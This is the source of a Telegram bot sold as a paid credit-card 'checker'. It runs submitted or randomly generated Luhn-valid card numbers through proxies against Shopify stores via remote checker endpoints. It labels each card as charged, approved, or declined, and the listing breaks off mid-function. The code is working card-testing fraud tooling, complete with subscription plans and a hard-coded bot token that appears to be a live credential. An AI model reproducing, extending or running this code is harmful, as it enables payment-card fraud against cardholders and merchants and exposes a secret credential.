# bot.py — OGGY PROO Checker
import asyncio
import html
import json
import logging
import os
import random
import re
import secrets
import sqlite3
import string
import sys
import threading
import time
import uuid
from contextlib import contextmanager
from datetime import datetime, timezone, timedelta
from typing import Optional, List, Dict, Any
from urllib.parse import quote

import aiohttp
from aiohttp import web
from aiogram import Bot, Dispatcher, Router, F, BaseMiddleware
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart, CommandObject
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    InputMediaPhoto, LabeledPrice, PreCheckoutQuery, SuccessfulPayment,
    Document, BotCommand, BufferedInputFile
)
from aiogram.client.default import DefaultBotProperties
from aiogram.client.session.aiohttp import AiohttpSession
from aiogram.exceptions import TelegramBadRequest

# ══════════════════════════════════════════════════════════════════════════════
# CONFIG
# ══════════════════════════════════════════════════════════════════════════════
BOT_TOKEN  = os.environ.get("BOT_TOKEN", "8785336986:AAEMuulh3dw0Cdyi7c88c81kq6B2HT-kcCs")
DATA_DIR   = os.environ.get("DATA_DIR", ".")
os.makedirs(DATA_DIR, exist_ok=True)

DB_PATH         = os.path.join(DATA_DIR, "bot.db")
ENDPOINTS_FILE  = os.path.join(DATA_DIR, "api_endpoints.json")
SITES_FILE      = os.path.join(DATA_DIR, "sites.txt")
PROXY_POOL_FILE = os.path.join(DATA_DIR, "proxy.txt")
KEYS_FILE       = os.path.join(DATA_DIR, "keys.json")
PREMIUM_FILE    = os.path.join(DATA_DIR, "premium.txt")

PRIMARY_ADMIN_ID = 8919487892
OWNER_NAME       = "𝑶𝑮𝑮𝒀 𝑷𝑹𝑶𝑶"
OWNER_USERNAME   = "OggyProo"
OWNER_ID         = PRIMARY_ADMIN_ID
KEY_PREFIX       = "OGGY-PROO"

DEFAULT_ENDPOINTS = {
    "endpoints": [
        {"url": "http://62.169.23.129:8080/shopii", "key": None},
        {"url": "http://5.83.136.102:8136/shopify", "key": "CHIRAG"},
        {"url": "http://5.83.136.102:8137/shopify", "key": "CHIRAG"},
        {"url": "https://check.yzio.app/shopify", "key": None}
    ],
    "active_idx": 0
}

DEFAULT_SITES: List[str] = []  # intentionally empty

TEST_CARD = "4111111111111111|12|30|123"

IMG_MAIN    = "https://files.catbox.moe/rwc563.jpg"
IMG_SHOP    = "https://files.catbox.moe/qqbj3x.jpg"
IMG_HIT     = "https://files.catbox.moe/9yypzu.jpg"
IMG_DECLINE = "https://files.catbox.moe/ejon6m.jpg"
IMG_CHECK   = "https://files.catbox.moe/c3rib3.jpg"
IMG_TOOLS   = "https://files.catbox.moe/oooo15.jpg"

TELEGRAM_PROXY = os.environ.get("TELEGRAM_PROXY") or None

PLANS = {
    "free":      {"name": "Beginner", "limit": 1000,  "mass_limit": 100,  "stars": 0},
    "pro":       {"name": "Pro",      "limit": 5000,  "mass_limit": 200,  "stars": 200},
    "premium":   {"name": "Premium",  "limit": 10000, "mass_limit": 400,  "stars": 200},
    "max":       {"name": "MAX",      "limit": 30000, "mass_limit": 500,  "stars": 500},
    "unlimited": {"name": "Unlimited","limit": 999999, "mass_limit": 1000, "stars": 800},
}

STAR_PRODUCTS = {
    "star_premium":   {"plan": "premium",   "stars": 200, "days": 30, "label": "Premium — 30 Days"},
    "star_max":       {"plan": "max",       "stars": 500, "days": 30, "label": "MAX — 30 Days"},
    "star_unlimited": {"plan": "unlimited", "stars": 800, "days": 30, "label": "Unlimited — 30 Days"},
}

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger("oggy")

EMOJI = {
    "settings":"5877260593903177342","back":"5875082500023258804","forward":"5832251986635920010",
    "user":"5879770735999717115","pen":"5839380580080293813","docs":"5877301185639091664",
    "trash":"5879915802815107172","unlock":"5886505193180239900","star":"5839116473951328489",
    "chat":"5793933761594789855","help":"5897846616966041652","tools":"5988023995125993550",
    "stop":"5870734657384877785","add":"5920090136627908485","shop":"5983399041197675256",
    "gem":"5778546023349621090","gem2":"5963312935148195483","gem3":"6028530359975548369",
    "chat2":"5985617073978481575","cross1":"5985346521103604145","up":"6030861234432121355",
    "num1":"5794182096603847292","pen2":"5985774024968379294","loading":"6258124820400049944",
    "infinity":"6258154670422757760","heart":"6257853292567597091","percent":"6258071055999438126",
    "warn_red":"6257858798715670989","chart":"6258267877170745815","check":"6258098853027778582",
    "online":"6260192112713666900","gem4":"6260181985180782013","up_tri":"6262482227930598980",
    "diamond":"6260156752247918115","refresh":"6260297232038235681","check2":"6262671743362535108",
    "diamond2":"6260308957298954089","green_sq":"6260565633134498058","down_tri":"6260486601441284439",
    "ghost":"6282819035516113016","cross2":"6282852025159913806","check3":"6280338743442280499",
    "hourglass":"6280443553529204094","glow_star":"6280674670014369924","smile":"6282811871510662984",
    "upside":"6282622386143498738","warn":"6206077285720659346","warn2":"6206174450765796040",
    "link":"6206497372176913599","book":"6206112371308500200","pill":"6206378324273403309",
    "bell":"6206508629286196237","red_x":"6206110936789423908",
}

class PremiumButton(InlineKeyboardButton):
    icon_custom_emoji_id: Optional[str] = None
    style: Optional[str] = None

def pbtn(text, *, icon="star", color="primary", callback_data=None, url=None):
    try:
        return PremiumButton(text=text, callback_data=callback_data, url=url,
                             icon_custom_emoji_id=EMOJI.get(icon, EMOJI["star"]), style=color)
    except Exception:
        return InlineKeyboardButton(text=text, callback_data=callback_data, url=url)

def pe(name):
    return f'<tg-emoji emoji-id="{EMOJI.get(name, EMOJI["star"])}">⭐</tg-emoji>'

def esc(text):
    return html.escape(str(text) if text is not None else "")

_SC_MAP = {'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ꜰ','g':'ɢ','h':'ʜ','i':'ɪ','j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'ǫ','r':'ʀ','s':'ꜱ','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ'}
def sc(text: str) -> str:
    return "".join(_SC_MAP.get(ch.lower(), ch) for ch in str(text))

def channel_url(ch: str) -> str:
    if not ch: return ""
    ch = ch.strip()
    if ch.startswith(("http://", "https://")): return ch
    if ch.startswith("@"): return f"https://t.me/{ch[1:]}"
    return f"https://t.me/{ch}"

# ══════════════════════════════════════════════════════════════════════════════
# ENDPOINTS
# ══════════════════════════════════════════════════════════════════════════════
_endpoints_cache: Optional[dict] = None

def load_endpoints(force: bool = False) -> dict:
    global _endpoints_cache
    if _endpoints_cache is not None and not force:
        return _endpoints_cache
    if not os.path.exists(ENDPOINTS_FILE):
        _endpoints_cache = json.loads(json.dumps(DEFAULT_ENDPOINTS))
        _save_endpoints_raw(_endpoints_cache)
        return _endpoints_cache
    try:
        with open(ENDPOINTS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if not isinstance(data, dict) or not isinstance(data.get("endpoints"), list):
            raise ValueError("bad structure")
        if not data["endpoints"]:
            data = json.loads(json.dumps(DEFAULT_ENDPOINTS))
        ai = int(data.get("active_idx", 0))
        if not (0 <= ai < len(data["endpoints"])):
            ai = 0
        data["active_idx"] = ai
        _endpoints_cache = data
        return data
    except Exception as e:
        log.warning(f"endpoints load: {e}")
        _endpoints_cache = json.loads(json.dumps(DEFAULT_ENDPOINTS))
        _save_endpoints_raw(_endpoints_cache)
        return _endpoints_cache

def _save_endpoints_raw(data: dict):
    try:
        with open(ENDPOINTS_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        log.warning(f"endpoints save: {e}")

def save_endpoints(data: dict):
    global _endpoints_cache
    _endpoints_cache = data
    _save_endpoints_raw(data)

def get_active_endpoint() -> Optional[dict]:
    data = load_endpoints()
    eps = data.get("endpoints") or []
    if not eps:
        return None
    idx = data.get("active_idx", 0)
    if not (0 <= idx < len(eps)):
        idx = 0
    ep = eps[idx]
    if not isinstance(ep, dict) or not ep.get("url"):
        return None
    return ep

def build_api_url(endpoint: dict, cc: str, site: str, proxy: str) -> str:
    base = endpoint["url"]
    sep = "&" if "?" in base else "?"
    q = (f"{sep}site={quote(site, safe='')}"
         f"&cc={quote(cc, safe='')}"
         f"&proxy={quote(proxy or '', safe='')}")
    key = endpoint.get("key")
    if key:
        q += f"&key={quote(str(key), safe='')}"
    return base + q

# ══════════════════════════════════════════════════════════════════════════════
# SITES TXT
# ══════════════════════════════════════════════════════════════════════════════
def _write_sites_txt(sites: List[str]):
    try:
        with open(SITES_FILE, "w", encoding="utf-8") as f:
            f.write("\n".join(sites) + ("\n" if sites else ""))
    except Exception as e:
        log.warning(f"sites.txt write: {e}")

def _read_sites_txt() -> List[str]:
    try:
        if os.path.exists(SITES_FILE):
            with open(SITES_FILE, "r", encoding="utf-8") as f:
                return [line.strip() for line in f if line.strip()]
    except Exception:
        pass
    return []

def _sync_sites_txt_from_db():
    try:
        with db() as c:
            rows = c.execute("SELECT url FROM sites ORDER BY id").fetchall()
            _write_sites_txt([r["url"] for r in rows])
    except Exception:
        pass

# ══════════════════════════════════════════════════════════════════════════════
# DB
# ══════════════════════════════════════════════════════════════════════════════
_db_conn = None
_db_lock = threading.RLock()
_db_write_lock: Optional[asyncio.Lock] = None

def _get_write_lock() -> asyncio.Lock:
    global _db_write_lock
    if _db_write_lock is None:
        _db_write_lock = asyncio.Lock()
    return _db_write_lock

def _get_conn():
    global _db_conn
    if _db_conn is None:
        _db_conn = sqlite3.connect(DB_PATH, timeout=60, check_same_thread=False)
        _db_conn.row_factory = sqlite3.Row
        _db_conn.execute("PRAGMA journal_mode=WAL")
        _db_conn.execute("PRAGMA synchronous=NORMAL")
        _db_conn.execute("PRAGMA busy_timeout=60000")
    return _db_conn

@contextmanager
def db():
    conn = _get_conn()
    with _db_lock:
        try:
            yield conn
            conn.commit()
        except Exception:
            conn.rollback()
            raise

def init_db():
    with db() as c:
        c.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            uid INTEGER PRIMARY KEY, username TEXT DEFAULT '', plan TEXT DEFAULT 'free',
            premium_until TEXT DEFAULT '', daily_checks INTEGER DEFAULT 0,
            last_check_date TEXT DEFAULT '', credits INTEGER DEFAULT 50,
            last_credit_date TEXT DEFAULT '', trial_last_used TEXT DEFAULT '',
            awaiting TEXT DEFAULT '', banned INTEGER DEFAULT 0, refer_count INTEGER DEFAULT 0,
            referred_by INTEGER DEFAULT 0, streak INTEGER DEFAULT 0,
            last_streak_date TEXT DEFAULT '', total_checks INTEGER DEFAULT 0,
            total_hits INTEGER DEFAULT 0, last_seen TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
        CREATE TABLE IF NOT EXISTS redeem_codes (code TEXT PRIMARY KEY, plan TEXT, max_uses INTEGER, used INTEGER DEFAULT 0, days INTEGER DEFAULT 30);
        CREATE TABLE IF NOT EXISTS redeem_log (id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, uid INTEGER, used_at TEXT, UNIQUE(code, uid));
        CREATE TABLE IF NOT EXISTS check_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, uid INTEGER, cc TEXT, response TEXT, status TEXT, gateway TEXT, ts TEXT);
        CREATE TABLE IF NOT EXISTS saved_cards (id INTEGER PRIMARY KEY AUTOINCREMENT, uid INTEGER, cc TEXT, saved_at TEXT, UNIQUE(uid, cc));
        CREATE TABLE IF NOT EXISTS bin_cache (bin TEXT PRIMARY KEY, data TEXT, ts TEXT);
        CREATE TABLE IF NOT EXISTS user_proxies (
            id INTEGER PRIMARY KEY AUTOINCREMENT, uid INTEGER, proxy TEXT,
            status TEXT DEFAULT 'unknown', latency REAL DEFAULT 0,
            checked_at TEXT DEFAULT '', UNIQUE(uid, proxy)
        );
        CREATE TABLE IF NOT EXISTS sites (id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT UNIQUE);
        CREATE TABLE IF NOT EXISTS force_channels (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id TEXT UNIQUE, title TEXT DEFAULT '', chat_type TEXT DEFAULT 'channel',
            invite_link TEXT DEFAULT '', enabled INTEGER DEFAULT 1, added_at TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS extra_admins (
            uid INTEGER PRIMARY KEY,
            username TEXT DEFAULT '',
            added_by INTEGER DEFAULT 0,
            added_at TEXT DEFAULT ''
        );
        """)
        for k, v in [
            ("auto_post_chat", ""),
            ("public_channel", ""),
            ("hit_log_channel", ""),
            ("maintenance", "0"),
            ("site_health", "{}"),
            ("bot_name", "OGGY PROO"),
            ("dev_name", OWNER_NAME),
            ("dev_username", f"@{OWNER_USERNAME}"),
            ("network_name", "OGGY NETWORK"),
            ("network_username", f"@{OWNER_USERNAME}"),
        ]:
            c.execute("INSERT OR IGNORE INTO settings(key, value) VALUES (?,?)", (k, v))

        cnt = c.execute("SELECT COUNT(*) as n FROM sites").fetchone()["n"]
        if cnt == 0:
            seed = _read_sites_txt()
            for s in seed:
                c.execute("INSERT OR IGNORE INTO sites(url) VALUES (?)", (s,))
    _sync_sites_txt_from_db()
    _load_plans_override()

def _load_plans_override():
    try:
        with db() as c:
            for pk in PLANS:
                for field in ["limit", "mass_limit", "stars"]:
                    r = c.execute("SELECT value FROM settings WHERE key=?",
                                  (f"plan_{pk}_{field}",)).fetchone()
                    if r and str(r["value"]).lstrip("-").isdigit():
                        PLANS[pk][field] = int(r["value"])
    except Exception:
        pass

def get_setting(key, default=""):
    try:
        with db() as c:
            r = c.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
            return r["value"] if r else default
    except Exception:
        return default

def set_setting(key, value):
    with db() as c:
        c.execute("INSERT INTO settings(key, value) VALUES (?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value", (key, value))

# ══════════════════════════════════════════════════════════════════════════════
# BRANDING
# ══════════════════════════════════════════════════════════════════════════════
def get_branding() -> dict:
    return {
        "bot_name":         get_setting("bot_name", "OGGY PROO"),
        "dev_name":         get_setting("dev_name", OWNER_NAME),
        "dev_username":     get_setting("dev_username", f"@{OWNER_USERNAME}"),
        "network_name":     get_setting("network_name", "OGGY NETWORK"),
        "network_username": get_setting("network_username", f"@{OWNER_USERNAME}"),
    }

# ══════════════════════════════════════════════════════════════════════════════
# ADMINS
# ══════════════════════════════════════════════════════════════════════════════
def is_owner(uid: int) -> bool:
    return uid == PRIMARY_ADMIN_ID

def is_extra_admin(uid: int) -> bool:
    try:
        with db() as c:
            return c.execute("SELECT 1 FROM extra_admins WHERE uid=?", (uid,)).fetchone() is not None
    except Exception:
        return False

def is_admin(uid: int) -> bool:
    return is_owner(uid) or is_extra_admin(uid)

def add_extra_admin(uid: int, username: str = "") -> bool:
    with db() as c:
        c.execute("INSERT OR IGNORE INTO extra_admins(uid, username, added_by, added_at) VALUES (?,?,?,?)",
                  (uid, username or "", PRIMARY_ADMIN_ID, datetime.now(timezone.utc).isoformat()))
    return True

def remove_extra_admin(uid: int) -> bool:
    with db() as c:
        c.execute("DELETE FROM extra_admins WHERE uid=?", (uid,))
    return True

def list_extra_admins():
    try:
        with db() as c:
            return c.execute("SELECT * FROM extra_admins ORDER BY added_at").fetchall()
    except Exception:
        return []

# ══════════════════════════════════════════════════════════════════════════════
# USERS
# ══════════════════════════════════════════════════════════════════════════════
def get_user(uid):
    try:
        with db() as c:
            return c.execute("SELECT * FROM users WHERE uid=?", (uid,)).fetchone()
    except Exception:
        return None

def ensure_user(uid, username=""):
    try:
        with db() as c:
            row = c.execute("SELECT uid FROM users WHERE uid=?", (uid,)).fetchone()
            today = datetime.now(timezone.utc).date().isoformat()
            now = datetime.now(timezone.utc).isoformat()
            if not row:
                c.execute("INSERT OR IGNORE INTO users(uid, username, last_credit_date, last_check_date, last_seen) VALUES (?,?,?,?,?)",
                          (uid, username or "", today, today, now))
            else:
                c.execute("UPDATE users SET username=?, last_seen=? WHERE uid=?", (username or "", now, uid))
    except Exception as e:
        log.warning(f"ensure_user: {e}")

def get_user_or_create(uid, username=""):
    ensure_user(uid, username)
    return get_user(uid)

def set_awaiting(uid, state):
    ensure_user(uid)
    with db() as c:
        c.execute("UPDATE users SET awaiting=? WHERE uid=?", (state, uid))

def get_awaiting(uid):
    u = get_user(uid)
    return u["awaiting"] if u else ""

def is_banned(uid):
    u = get_user(uid)
    return bool(u and u["banned"])

def upgrade_user(uid, plan_name, days=30):
    if plan_name not in PLANS: return
    ensure_user(uid)
    exp = "" if plan_name == "unlimited" else (datetime.now(timezone.utc) + timedelta(days=days)).isoformat()
    with db() as c:
        c.execute("UPDATE users SET plan=?, premium_until=? WHERE uid=?", (plan_name, exp, uid))

class EnsureUserMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        try:
            u = data.get("event_from_user")
            if u and not getattr(u, "is_bot", False):
                ensure_user(u.id, u.username or "")
        except Exception as e:
            log.warning(f"mw: {e}")
        return await handler(event, data)

# ══════════════════════════════════════════════════════════════════════════════
# SITES
# ══════════════════════════════════════════════════════════════════════════════
_sites_cache = None
_sites_cache_ts = 0

def _invalidate_sites():
    global _sites_cache, _sites_cache_ts
    _sites_cache = None
    _sites_cache_ts = 0

def get_sites() -> List[str]:
    global _sites_cache, _sites_cache_ts
    now = time.time()
    if _sites_cache is not None and (now - _sites_cache_ts) < 30:
        return _sites_cache
    try:
        with db() as c:
            rows = c.execute("SELECT url FROM sites ORDER BY id").fetchall()
            _sites_cache = [r["url"] for r in rows]
    except Exception:
        _sites_cache = []
    _sites_cache_ts = now
    return _sites_cache

def _clean_site_url(url: str) -> str:
    url = url.strip()
    if url.startswith("https://"): url = url[8:]
    elif url.startswith("http://"): url = url[7:]
    url = url.rstrip("/")
    if ".myshopify.com" not in url and ".com" not in url and "." not in url:
        url = url + ".myshopify.com"
    return url

def add_site(url: str) -> bool:
    url = _clean_site_url(url)
    if not url: return False
    with db() as c:
        c.execute("INSERT OR IGNORE INTO sites(url) VALUES (?)", (url,))
    _invalidate_sites()
    _sync_sites_txt_from_db()
    return True

def remove_site(url: str) -> bool:
    url = url.strip()
    with db() as c:
        c.execute("DELETE FROM sites WHERE url=?", (url,))
    _invalidate_sites()
    _sync_sites_txt_from_db()
    _site_cooldown_until.pop(url, None)
    _site_fail_count.pop(url, None)
    return True

# ══════════════════════════════════════════════════════════════════════════════
# FORCE CHANNELS
# ══════════════════════════════════════════════════════════════════════════════
def force_channels_list(enabled_only=False):
    with db() as c:
        q = "SELECT * FROM force_channels"
        if enabled_only: q += " WHERE enabled=1"
        q += " ORDER BY id"
        return c.execute(q).fetchall()

def add_force_channel(chat_id: str, title: str = "", chat_type: str = "channel", invite_link: str = ""):
    with db() as c:
        c.execute("""INSERT OR REPLACE INTO force_channels(chat_id, title, chat_type, invite_link, enabled, added_at)
                     VALUES (?, ?, ?, ?, 1, ?)""",
                  (str(chat_id), title, chat_type, invite_link, datetime.now(timezone.utc).isoformat()))

def remove_force_channel(chat_id: str):
    with db() as c:
        c.execute("DELETE FROM force_channels WHERE chat_id=?", (str(chat_id),))

def toggle_force_channel(chat_id: str):
    with db() as c:
        row = c.execute("SELECT enabled FROM force_channels WHERE chat_id=?", (str(chat_id),)).fetchone()
        if row:
            new = 0 if row["enabled"] else 1
            c.execute("UPDATE force_channels SET enabled=? WHERE chat_id=?", (new, str(chat_id)))
            return new
    return 0

async def check_force_sub(bot, uid):
    if is_admin(uid): return True
    channels = force_channels_list(enabled_only=True)
    if not channels: return True
    for ch in channels:
        try:
            m = await bot.get_chat_member(ch["chat_id"], uid)
            if m.status in ("left", "kicked"): return False
        except Exception as e:
            log.warning(f"force_sub {ch['chat_id']}: {e}")
    return True

# ══════════════════════════════════════════════════════════════════════════════
# SITE POOL
# ══════════════════════════════════════════════════════════════════════════════
_site_fail_count = {}
_site_cooldown_until = {}
MAX_SITE_ATTEMPTS = 3
SITE_MIN_GAP = 1.5
_site_last_hit: Dict[str, float] = {}
_site_locks: Dict[str, asyncio.Lock] = {}

async def acquire_site_slot(site: str):
    if not site: return
    lock = _site_locks.setdefault(site, asyncio.Lock())
    async with lock:
        now = time.time()
        last = _site_last_hit.get(site, 0)
        wait = SITE_MIN_GAP - (now - last)
        if wait > 0: await asyncio.sleep(wait)
        _site_last_hit[site] = time.time()

def _is_site_benched(site): return time.time() < _site_cooldown_until.get(site, 0)
def _bench_site(site, seconds=120):
    _site_cooldown_until[site] = time.time() + seconds
    log.warning(f"[bench] {site} for {seconds}s")

def _pick_random_sites(n=MAX_SITE_ATTEMPTS):
    sites = get_sites()
    if not sites: return []
    healthy = [s for s in sites if not _is_site_benched(s)]
    pool = healthy if healthy else list(sites)
    random.shuffle(pool)
    return pool[:n]

_mass_tasks = {}

# ══════════════════════════════════════════════════════════════════════════════
# CARDS
# ══════════════════════════════════════════════════════════════════════════════
CC_REGEX = re.compile(r"^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$")

def normalize_cc(raw):
    if not raw: return None
    s = re.sub(r"[\s:;,/\-]+", "|", raw.strip())
    parts = [p for p in s.split("|") if p]
    if len(parts) != 4: return None
    num, mm, yy, cvv = parts
    num, mm, yy, cvv = (re.sub(r"\D", "", x) for x in (num, mm, yy, cvv))
    if not (num and mm and yy and cvv): return None
    if len(yy) == 4: yy = yy[2:]
    if not (13 <= len(num) <= 19): return None
    mm, yy = mm.zfill(2)[:2], yy.zfill(2)[:2]
    cvv = cvv.zfill(3)[:4]
    cc = f"{num}|{mm}|{yy}|{cvv}"
    return cc if CC_REGEX.match(cc) else None

def country_flag(code):
    if not code or len(code) != 2 or not code.isalpha(): return "🌍"
    return chr(0x1F1E6 + ord(code[0].upper()) - 65) + chr(0x1F1E6 + ord(code[1].upper()) - 65)

def luhn_check_digit(partial):
    for d in "0123456789":
        if luhn_ok(partial + d): return d
    return "0"

def luhn_ok(card):
    if not card.isdigit(): return False
    total, rev = 0, card[::-1]
    for i, ch in enumerate(rev):
        d = ord(ch) - 48
        if i % 2 == 1:
            d *= 2
            if d > 9: d -= 9
        total += d
    return total % 10 == 0

def brand_pe(cc):
    if cc.startswith('4'): return f"{pe('gem')} ᴠɪꜱᴀ"
    if cc.startswith('5'): return f"{pe('gem2')} ᴍᴀꜱᴛᴇʀ"
    if cc.startswith(('34','37')): return f"{pe('gem3')} ᴀᴍᴇx"
    if cc.startswith('6'): return f"{pe('gem4')} ᴅɪꜱᴄ"
    return f"{pe('gem3')} ᴄᴀʀᴅ"

def generate_cc(bin_prefix="4", count=1):
    cards = []
    for _ in range(count):
        length = 15 if bin_prefix.startswith(("34", "37")) else 16
        prefix = bin_prefix or "4"
        middle = "".join(random.choices(string.digits, k=length - len(prefix) - 1))
        body = prefix + middle
        card = body + luhn_check_digit(body)
        mm = f"{random.randint(1,12):02d}"
        yy = f"{random.randint(26,32):02d}"
        cvv = f"{random.randint(0,999):03d}"
        cards.append(f"{card}|{mm}|{yy}|{cvv}")
    return cards

# ══════════════════════════════════════════════════════════════════════════════
# PROXIES
# ══════════════════════════════════════════════════════════════════════════════
LIVE_PROXY_LIMIT = 50
PROXY_TEST_TIMEOUT = 20
PROXY_TEST_BATCH = 5
_proxy_dead_cache: Dict[str, tuple] = {}
_PROXY_DEAD_TTL = 300

def normalize_proxy(proxy: str) -> Optional[str]:
    if not proxy: return None
    p = proxy.strip()
    if not p: return None
    if p.startswith(("http://", "https://", "socks5://", "socks4://")):
        if "@" not in p: return None
        return p
    if "@" in p: return f"http://{p}"
    return None

def _append_proxy_pool(proxy: str):
    try:
        existing = set()
        if os.path.exists(PROXY_POOL_FILE):
            with open(PROXY_POOL_FILE, "r", encoding="utf-8") as f:
                existing = {l.strip() for l in f if l.strip()}
        if proxy in existing: return
        with open(PROXY_POOL_FILE, "a", encoding="utf-8") as f:
            f.write(proxy + "\n")
    except Exception as e:
        log.warning(f"proxy pool append: {e}")

def _remove_from_proxy_pool(proxy: str):
    try:
        if not os.path.exists(PROXY_POOL_FILE): return
        with open(PROXY_POOL_FILE, "r", encoding="utf-8") as f:
            lines = [l.rstrip("\n") for l in f]
        out = [l for l in lines if l.strip() and l.strip() != proxy]
        with open(PROXY_POOL_FILE, "w", encoding="utf-8") as f:
            f.write("\n".join(out) + ("\n" if out else ""))
    except Exception as e:
        log.warning(f"proxy pool remove: {e}")

def user_proxy_list(uid):
    with db() as c:
        rows = c.execute("SELECT proxy FROM user_proxies WHERE uid=? AND status='live' ORDER BY id", (uid,)).fetchall()
    return [r["proxy"] for r in rows]

def user_proxy_all(uid):
    with db() as c:
        return c.execute("SELECT * FROM user_proxies WHERE uid=? ORDER BY id DESC", (uid,)).fetchall()

def clear_user_proxies(uid):
    with db() as c:
        c.execute("DELETE FROM user_proxies WHERE uid=?", (uid,))

def pick_user_proxy(uid):
    live = user_proxy_list(uid)
    if not live: return None
    return random.choice(live)

def proxy_display(proxy: str, show_auth: bool = False) -> str:
    if show_auth: return proxy
    if "@" in proxy and "://" in proxy:
        try:
            scheme, rest = proxy.split("://", 1)
            if "@" in rest:
                _, hostport = rest.rsplit("@", 1)
                return f"{scheme}://***:***@{hostport}"
        except Exception:
            pass
    return proxy[:60]

async def _is_proxy_dead(proxy: str) -> bool:
    if not proxy: return True
    cached = _proxy_dead_cache.get(proxy)
    if cached and (time.time() - cached[0]) < _PROXY_DEAD_TTL:
        return cached[1]
    dead = True
    try:
        connector = aiohttp.TCPConnector(force_close=True)
        async with aiohttp.ClientSession(connector=connector) as sess:
            async with sess.get("https://api.ipify.org?format=json", proxy=proxy,
                                timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status == 200: dead = False
    except Exception:
        dead = True
    _proxy_dead_cache[proxy] = (time.time(), dead)
    return dead

def parse_proxy_txt(raw: str) -> List[str]:
    if not raw: return []
    tokens = re.split(r"[\r\n,;\t]+", raw)
    out, seen = [], set()
    for t in tokens:
        t = t.strip()
        if not t or len(t) < 8 or t.startswith("#") or t.startswith("//"): continue
        normalized = normalize_proxy(t)
        if not normalized or normalized in seen: continue
        seen.add(normalized)
        out.append(normalized)
    return out

# ══════════════════════════════════════════════════════════════════════════════
# BIN
# ══════════════════════════════════════════════════════════════════════════════
async def lookup_bin(bin_number):
    try:
        with db() as c:
            row = c.execute("SELECT data FROM bin_cache WHERE bin=?", (bin_number[:6],)).fetchone()
            if row: return json.loads(row["data"])
    except Exception:
        pass
    try:
        async with aiohttp.ClientSession() as sess:
            async with sess.get(f"https://data.handyapi.com/bin/{bin_number}",
                                timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status == 200:
                    data = await r.json()
                    if data.get("Status") == "SUCCESS":
                        try:
                            async with _get_write_lock():
                                with db() as c:
                                    c.execute("INSERT OR REPLACE INTO bin_cache(bin, data, ts) VALUES (?,?,?)",
                                              (bin_number[:6], json.dumps(data),
                                               datetime.now(timezone.utc).isoformat()))
                        except Exception as e:
                            log.warning(f"bin cache: {e}")
                        return data
                return {"error": "BIN not found"}
    except Exception:
        return {"error": "BIN API unreachable"}

# ══════════════════════════════════════════════════════════════════════════════
# PARSER
# ══════════════════════════════════════════════════════════════════════════════
CHARGED_KEYWORDS = ["CHARGE", "PAID", "SUCCESS", "ORDER_PLACED", "ORDER_PAID",
                    "PAYMENT_SUCCESSFULL", "CAPTURED", "COMPLETED", "FULFILLED"]
CHARGED_NEGATIVE = ["NO_CHARGE", "NOT_CHARGED", "UNCHARGED", "CHARGE_FAILED", "NOT_PAID"]
NSF_KEYWORDS      = ["INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS"]
CCN_KEYWORDS      = ["INCORRECT_CVC", "INVALID_CVC", "CVV_FAILURE", "INVALID CVV"]
SITE_ERR_KEYWORDS = ["NO_PRODUCTS", "PRODUCTS_NOT_FOUND", "PAYMENTS_ZONE_NOT_FOUND", "INVALID_SHOP"]

def _extract_success(raw):
    for src in (raw, raw.get("data") if isinstance(raw.get("data"), dict) else None):
        if not isinstance(src, dict): continue
        for k in ("Status", "status", "success", "Success", "ok"):
            if k in src:
                v = src[k]
                if isinstance(v, bool): return v
                if isinstance(v, str):
                    lv = v.strip().lower()
                    if lv in ("true", "ok", "1", "yes"): return True
                    if lv in ("false", "no", "0"): return False
    return None

def _extract_message(raw):
    candidates = ("message", "Message", "msg", "Msg", "Response", "response",
                  "reason", "Reason", "status_message", "detail", "error")
    for src in (raw, raw.get("data") if isinstance(raw.get("data"), dict) else None):
        if not isinstance(src, dict): continue
        for k in candidates:
            if k in src and src[k] is not None:
                return str(src[k])
    return json.dumps(raw, ensure_ascii=False)[:300]

def classify_response(raw: dict):
    if not isinstance(raw, dict):
        return "DECLINED", str(raw)[:200]
    success = _extract_success(raw)
    message = _extract_message(raw)
    up = message.upper()

    if any(k in up for k in SITE_ERR_KEYWORDS):
        return "SITE_ERROR", message

    if success is True:
        if any(k in up for k in NSF_KEYWORDS): return "APPROVED_NSF", message
        if any(k in up for k in CCN_KEYWORDS): return "APPROVED_CCN", message
        if any(k in up for k in CHARGED_KEYWORDS) and not any(n in up for n in CHARGED_NEGATIVE):
            return "CHARGED", message
        return "APPROVED", message

    if any(k in up for k in NSF_KEYWORDS): return "APPROVED_NSF", message
    if any(k in up for k in CCN_KEYWORDS): return "APPROVED_CCN", message
    return "DECLINED", message

# ══════════════════════════════════════════════════════════════════════════════
# API CALL
# ══════════════════════════════════════════════════════════════════════════════
async def call_api(cc: str, proxy: Optional[str] = None,
                   site: Optional[str] = None, endpoint: Optional[dict] = None) -> Dict[str, Any]:
    ep = endpoint or get_active_endpoint()
    if not ep:
        return {"error": "No API configured", "live": False, "charged": False}
    if not site:
        picked = _pick_random_sites(1)
        site = picked[0] if picked else ""
    if not site:
        return {"error": "No sites available. Add via /addsite",
